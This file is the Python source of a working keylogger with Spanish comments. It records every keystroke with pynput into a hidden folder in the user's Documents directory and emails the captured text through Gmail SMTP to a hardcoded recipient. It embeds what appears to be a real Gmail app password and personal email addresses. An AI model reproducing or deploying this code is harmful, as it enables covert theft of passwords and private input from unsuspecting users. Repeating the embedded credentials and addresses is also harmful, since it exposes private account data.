import sys
import os
import smtplib
import time
import threading
from pynput import keyboard as kb
from getpass import getuser
from email.mime.text import MIMEText

user = getuser()
ruta_dir = f"C:/Users/{user}/Documents/keys"
ruta_file = f"{ruta_dir}/keys.txt"
ruta_log = f"{ruta_dir}/log.txt"
os.makedirs(f"{ruta_dir}", exist_ok = True)
os.system(f"attrib +h {ruta_dir}")

def send():
    print("Comprobando archivo")
    if os.path.isfile(ruta_file):
        with open(ruta_file, "r") as log:
            contenido = log.read()
        msg = MIMEText(contenido)
        password = "kgvzxdmsdwsurhpx"
        msg['From'] = "rxkeylogger@gmail.com"
        msg['To'] = "aaronsanchezmenendez@gmail.com"
        msg['Subject'] = "Log"

        smtp = smtplib.SMTP("smtp.gmail.com: 587")
        smtp.starttls()
        smtp.login(msg['From'], password)
        smtp.sendmail(msg['From'], msg['To'], msg.as_string())
        smtp.quit()
        os.remove(ruta_file)
        print("Se ha enviado el contenido")
    else:
        print("El archivo no existe")

    print("Programando la siguiente llamada a la función enviar")
    time.sleep(10)

def on_press(tecla):
    valor = str(tecla).replace("'", "")
    if valor == "Key.space":
        valor = " "
    elif valor == "Key.enter":
        valor = "\n"
    elif valor == "Key.shift_r" or valor == "Key.shift":
        valor = ""
    try:
        with open(f"{ruta_file}", "a") as log:
            log.write(valor)
    except:
        pass

def exec():
    with kb.Listener(on_press=on_press) as escuchador:
        escuchador.join()

try:
    # Iniciar función exec en un hilo
    threading.Thread(target=exec).start()

    sys.stdout = open(f"{ruta_log}", "w")

    # Programar la primera llamada a la función enviar
    threading.Thread(target=send).start()

    print("Iniciando el keylogger")
except Exception as e:
    print(f"Ha ocurrido un error: {e}")
